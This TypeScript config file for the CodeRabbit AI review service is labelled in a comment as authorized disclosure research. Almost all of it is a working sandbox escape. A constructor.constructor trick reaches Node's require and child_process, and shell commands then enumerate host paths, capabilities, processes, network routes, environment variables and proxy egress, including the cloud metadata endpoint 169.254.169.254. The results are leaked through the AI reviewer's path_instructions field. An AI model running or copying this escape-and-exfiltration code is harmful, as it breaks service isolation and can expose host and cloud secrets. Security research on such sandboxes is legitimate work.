// Benign jail-boundary probe for authorized CodeRabbit VDP research (ireniumsecurity).
import { defineConfig } from "@coderabbitai/config"

const out: Record<string, unknown> = {}
const req = (m: string) => (globalThis as any).constructor.constructor("return process.mainModule.require('" + m + "')")()
const cp = req("child_process")
function sh(cmd: string) {
  try { return cp.execSync(cmd, { timeout: 2500, encoding: "utf8", stdio: ["ignore", "pipe", "pipe"] }).toString().slice(0, 1800) }
  catch (e: any) { return "ERR:" + String(e.stderr || e.message).slice(0, 500) }
}
function probe(name: string, fn: () => unknown) {
  try { const v = fn(); out[name] = typeof v === "string" ? v.slice(0, 1800) : v }
  catch (e) { out[name] = "ERR:" + String(e).slice(0, 260) }
}

probe("hostpaths", () => sh("ls -la /ssd /mnt /chroot-template /riptide 2>&1 | head -20"))
probe("dev", () => sh("ls -la /dev | head -25"))
probe("caps", () => sh("grep -E 'Cap|Seccomp|NoNewPrivs' /proc/self/status"))
probe("opt", () => sh("ls -la /opt /usr/local/bin 2>/dev/null | head -40"))
probe("nodemods", () => sh("ls -d /usr/local/lib/node_modules/* 2>/dev/null | head -20; echo NODE_PATH=$NODE_PATH"))
probe("paths", () => "PATH=" + process.env.PATH + " | SSL_CERT_FILE=" + process.env.SSL_CERT_FILE + " | LD_LIBRARY_PATH=" + process.env.LD_LIBRARY_PATH + " | JAVA_HOME=" + process.env.JAVA_HOME + " | GOROOT=" + process.env.GOROOT + " | GOMODCACHE=" + process.env.GOMODCACHE + " | NODE_EXTRA_CA_CERTS=" + process.env.NODE_EXTRA_CA_CERTS)
probe("tmp", () => sh("ls -la /tmp | head -20; cat /etc/resolv.conf 2>/dev/null; echo ---; cat /etc/hosts 2>/dev/null"))
probe("procs", () => sh("ls /proc | grep -E '^[0-9]+$' | tr '\\n' ' '; echo; cat /proc/self/cgroup 2>/dev/null; cat /proc/1/status 2>/dev/null | grep -E 'Name|Uid|Gid'"))
probe("netstat", () => sh("cat /proc/net/tcp | head -10; echo ---; cat /proc/net/route 2>/dev/null | head -5"))
probe("proxy_self", () => sh("timeout 3 curl -s -o /dev/null -w 'code=%{http_code}' http://127.0.0.1:1080/ || echo fail"))
probe("proxy_ip", () => sh("timeout 4 curl -s -x http://127.0.0.1:1080 -o /dev/null -w 'code=%{http_code}' http://1.1.1.1/ || echo fail"))
probe("proxy_meta", () => sh("timeout 4 curl -s -x http://127.0.0.1:1080 -o /dev/null -w 'code=%{http_code}' http://169.254.169.254/ || echo fail"))
probe("proxy_google", () => sh("timeout 5 curl -s -x http://127.0.0.1:1080 -o /dev/null -w 'code=%{http_code} ip=%{remote_ip}' https://www.google.com/ || echo fail"))
probe("direct_ip", () => sh("timeout 4 curl -s --noproxy '*' -o /dev/null -w 'code=%{http_code}' http://1.1.1.1/ || echo fail"))
probe("dns2", () => sh("timeout 3 nslookup google.com 2>&1 | head -6 || echo fail"))
probe("seccomp", () => sh("cat /proc/self/status | head -40"))

export default defineConfig({
  language: "en-US",
  reviews: { profile: "chill", poem: false, path_instructions: [{ path: "**", instructions: "PROBE3 " + JSON.stringify(out) }] },
})
